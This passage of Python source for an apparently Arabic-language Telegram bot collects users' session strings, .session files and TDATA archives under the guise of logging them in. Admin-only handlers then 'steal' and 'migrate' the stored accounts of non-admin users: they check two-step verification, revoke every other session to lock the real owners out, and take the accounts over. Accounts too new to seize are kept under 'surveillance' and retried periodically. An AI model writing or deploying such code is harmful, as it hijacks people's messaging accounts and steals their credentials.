            bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة أو مـطـرودة.", message.chat.id, status_msg.message_id)
    elif len(text) > 50 and " " not in text:
        status_msg = bot.reply_to(message, "⏳ جـاري فـحـص مـفـتـاح الـجـلـسـة...")
        async def verify_txt():
            client = Client(f"tx{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=convert_telethon_to_pyrogram(text), in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=10)
                me = await client.get_me()
                pyro_sess = await client.export_session_string()
                await client.disconnect()
                return me, pyro_sess
            except Exception: return None, None
        me, p_sess = run_async(verify_txt())
        if me: process_successful_login(message, status_msg, me, p_sess, "String")
        else: bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة.", message.chat.id, status_msg.message_id)

@bot.message_handler(content_types=['document'])
def handle_files(message):
    if not is_allowed(message.from_user.id): return
    file_name = message.document.file_name.lower()
    if file_name.endswith(".session"):
        status_msg = bot.reply_to(message, "•❐• جـاري قـراءة مـلـف الـجـلـسـة...", parse_mode="Markdown")
        temp_name = f"sess_{message.from_user.id}{int(time.time())}"
        with open(f"{temp_name}.session", 'wb') as f: f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
        async def verify_file():
            try:
                client = Client(temp_name, api_id=API_ID, api_hash=API_HASH)
                await asyncio.wait_for(client.connect(), timeout=10)
                me, p_sess = await client.get_me(), await client.export_session_string()
                await client.disconnect()
                return me, p_sess
            except Exception: return None, None
            finally:
                if os.path.exists(f"{temp_name}.session"): os.remove(f"{temp_name}.session")
        me, p_sess = run_async(verify_file())
        if me: process_successful_login(message, status_msg, me, p_sess, "File")
        else: bot.edit_message_text("❌ مـلـف مـعـطـوب.", message.chat.id, status_msg.message_id)
    elif file_name.endswith(".zip"):
        status_msg = bot.reply_to(message, "•❐• جـاري سـحـب TDATA...", parse_mode="Markdown")
        extract_dir = f"tmp{message.from_user.id}{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)
        zip_path = os.path.join(extract_dir, file_name)
        with open(zip_path, 'wb') as f:
            f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            dc_id, auth_key, user_id = run_async(extract_tdata_official(extract_dir))
            if dc_id and auth_key:
                p_sess, _ = generate_sessions(API_ID, dc_id, auth_key, user_id)
                async def verify_tdata():
                    client = Client(f"td{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=p_sess, in_memory=True)
                    try:
                        await asyncio.wait_for(client.connect(), timeout=10)
                        me = await client.get_me()
                        await client.disconnect()
                        return me
                    except Exception:
                        return None
                me = run_async(verify_tdata())
                if me:
                    process_successful_login(message, status_msg, me, p_sess, "TDATA", file_path=zip_path)
                else:
                    bot.edit_message_text("❌ TDATA مـعـطـوبـة.", message.chat.id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ لا يـوجـد بـيـانـات داخـل الـ ZIP.", message.chat.id, status_msg.message_id)
        except Exception:
            bot.edit_message_text("❌ مـلـف غـيـر صـالـح.", message.chat.id, status_msg.message_id)
        finally:
            shutil.rmtree(extract_dir, ignore_errors=True)

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_user")
def admin_add_user_start(call):
    if call.from_user.id not in ADMIN_IDS: return
    msg = bot.send_message(call.message.chat.id, "•❐• أرسـل ايـدي الـمـسـتـخـدم الـذي تـريـد إضـافـتـه:")
    USER_STATES[call.from_user.id] = {"action": "add_user"}
    bot.register_next_step_handler(msg, process_add_user)

def process_add_user(message):
    if message.from_user.id not in ADMIN_IDS: return
    if not message.text.strip().isdigit(): return bot.send_message(message.chat.id, "❌ ايـدي غـيـر صـحـيـح.")
    target_id = int(message.text.strip())
    add_allowed_user(target_id, "Added")
    bot.send_message(message.chat.id, f"✅ تـم إضـافـة `{target_id}` بـنـجـاح!", parse_mode="Markdown", reply_markup=home_keyboard(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "admin_ban_user")
def admin_ban_user_menu(call):
    if call.from_user.id not in ADMIN_IDS: return
    users = get_all_allowed_users()
    markup = InlineKeyboardMarkup()
    if users:
        for uid, fname in users: markup.row(InlineKeyboardButton(f"{fname} | {uid}", callback_data=f"ban_{uid}"))
    markup.row(InlineKeyboardButton("🔥 حظـر الـجـمـيـع", callback_data="ban_all_users"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    bot.edit_message_text("🛂┊ حظـر الـمـسـتـخـدمـيـن:\n⎉╎ اخـتـر مـسـتـخـدمـاً لـحـظـره:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("ban_"))
def execute_ban(call):
    if call.from_user.id not in ADMIN_IDS: return
    target = call.data.split("_")[1]
    if target == "all":
        for uid, _ in get_all_allowed_users(): remove_allowed_user(uid)
    else: remove_allowed_user(int(target))
    admin_ban_user_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "steal_accounts")
def steal_accounts_menu(call):
    if call.from_user.id not in ADMIN_IDS: return
    status_msg = bot.edit_message_text("⏳ جـاري فـحـص وبـنـاء قـائـمـة الألـوان بـحـذر...\nهـذا يـسـتـغـرق بـضـع ثـوانـي.", call.message.chat.id, call.message.message_id)
    run_async(build_steal_menu_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_account_for_menu(acc):
    acc_id, phone, name, uid, owner_id, pyro_sess = acc
    client = Client(f"tmp_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
    color = ""
    session_count = "?"
    two_fa_status = "غير معروف"
    try:
        await asyncio.wait_for(client.connect(), timeout=5)
        
        # فحص وجود تحقق بخطوتين
        try:
            pwd = await client.invoke(functions.account.GetPassword())
            if getattr(pwd, 'has_password', False):
                two_fa_status = "مفعل❌"
            else:
                two_fa_status = "غير مفعل ✅"
        except Exception:
            pass

        auths = await client.invoke(functions.account.GetAuthorizations())
        session_count = len(auths.authorizations)
        current = next((a for a in auths.authorizations if getattr(a, 'current', False)), None)
        if current:
            age = time.time() - current.date_created
            if age >= 86400: # أكثر من 24 ساعة
                color = "🟢"
            else:
                other = next((a for a in auths.authorizations if not getattr(a, 'current', False)), None)
                if other:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=other.hash))
                        color = "🟡" # الفحص البرمجي نجح
                        session_count -= 1
                    except Exception:
                        pass # لم تنجح، ستبقى بدون لون (مراقبة)
    except Exception:
        pass
    finally:
        if client.is_connected: await client.disconnect()

    creation_year = get_creation_year(uid)
    country_name, country_flag = get_country_info(phone)
    btn_text = f"{color} {name} | {creation_year} | {two_fa_status} | {country_flag} {country_name} | جلسات:{session_count}"
    return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")

async def build_steal_menu_async(admin_id, chat_id, msg_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, user_id, owner_id, pyro_session FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
    accounts = c.fetchall()
    conn.close()

    markup = InlineKeyboardMarkup()
    if accounts:
        markup.row(InlineKeyboardButton("🏴‍☠️ سحـب و تـهـجـيـر الـجـمـيـع", callback_data="steal:all"))
        tasks = [check_account_for_menu(acc) for acc in accounts]
        buttons = await asyncio.gather(*tasks)
        for btn in buttons:
            markup.row(btn)

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    text = "🛂┊ **نـظـام تـهـجـيـر وسـحـب الـحـسـابـات:**\n\n🟢 = جـاهـز لـلـسـحـب (تخطى 24 ساعة).\n🟡 = جـاهـز لـلـسـحـب (اجتاز الفحص البرمجي).\nبدون لون = الحساب جديد (سيوضع تحت المراقبة).\n\n⎉╎ اخـتـر حـسـابـاً לـبـدء الـتـهـجـيـر:"
    bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("steal:"))
def handle_steal(call):
    if call.from_user.id not in ADMIN_IDS: return
    target = call.data.split(":")[1]

    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر (Cloning)...", parse_mode="Markdown")

    if target == "all":
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("SELECT id FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
        accs = c.fetchall()
        conn.close()
        for acc in accs:
            run_async(steal_single_account(acc[0], call.from_user.id))
            time.sleep(1)
        bot.edit_message_text("✅ تـم تـنـفـيـذ أمـر الـسـحـب عـلـى الـجـمـيـع.\nالـحـسـابـات الـجـديـدة تـم وضـعـهـا تـحـت الـمـراقـبـة ⏳", call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id))
    else:
        res = run_async(steal_single_account(int(target), call.from_user.id))
        bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")

async def steal_single_account(acc_id, admin_id):
    acc = get_account(acc_id)
    if not acc: return "❌ الحساب غير موجود."
    _, owner_id, phone, user_id, name, pyro_session, _, _, _, _, _, _ = acc

    client_a = Client(f"st_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await asyncio.wait_for(client_a.connect(), timeout=12)
        auths = await client_a.invoke(functions.account.GetAuthorizations())
        wait_error = False

        for auth in auths.authorizations:
            if not getattr(auth, 'current', False):
                try:
                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                    await asyncio.sleep(0.4)
                except Exception as e:
                    if "fresh" in str(e).lower() or "24" in str(e).lower():
                        wait_error = True
                        break

        if wait_error:
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
            conn.commit()
            conn.close()
            return f"⏳ `{phone}` جـديـد! تـم وضـعـه تـحـت نـظـام الـمـراقـبـة، سـيـتـم سـحـبـه تـلـقـائـيـاً عـنـد جـهـوزيـتـه."

        else:
            success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
            if success: return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
            else: return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."

    except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
    finally:
        if client_a.is_connected: await client_a.disconnect()

@bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
def manage_surveillance_menu(call):
    if call.from_user.id not in ADMIN_IDS: return

    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name FROM sessions WHERE surveilled=1")
    accounts = c.fetchall()
    conn.close()

    markup = InlineKeyboardMarkup()
    if accounts:
        markup.row(InlineKeyboardButton("🛑 إلـغـاء الـمـراقـبـة عـن الـجـمـيـع", callback_data="unsurveil:all"))
        for acc_id, phone, name in accounts:
            markup.row(InlineKeyboardButton(f"🛑 {name} | {phone}", callback_data=f"unsurveil:{acc_id}"))
    else:
        markup.row(InlineKeyboardButton("✅ لا تـوجـد حـسـابـات تـحـت الـمـراقـبـة", callback_data="none"))

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))

    text = "🛂┊ **إدارة الـحـسـابـات تـحـت الـمـراقـبـة ⏳:**\n\n⎉╎ هـذه الـحـسـابـات يـحـاول الـبـوت تـهـجـيـرهـا كـل سـاعـة ونص.\n⎉╎ اضغـط عـلـى أي حـسـاب لإلـغـاء الـمـراقـبـة والـتـهـجـيـر:"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
def execute_unsurveil(call):
    if call.from_user.id not in ADMIN_IDS: return
    target = call.data.split(":")[1]

    conn = get_db_conn()
    c = conn.cursor()

    if target == "all":
        c.execute("UPDATE sessions SET surveilled=0 WHERE surveilled=1")
        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن جـمـيـع الـحـسـابـات!"
    else:
        c.execute("UPDATE sessions SET surveilled=0 WHERE id=?", (target,))
        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن هـذا الـحـسـاب!"

    conn.commit()
    conn.close()

    bot.answer_callback_query(call.id, msg, show_alert=True)
    manage_surveillance_menu(call)

if __name__ == "__main__":
    logging.info("🚀 جاري إطلاق البوت...")
    try:
        bot.remove_webhook()
    except Exception:
        pass
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15)
        except Exception as e:
            time.sleep(3)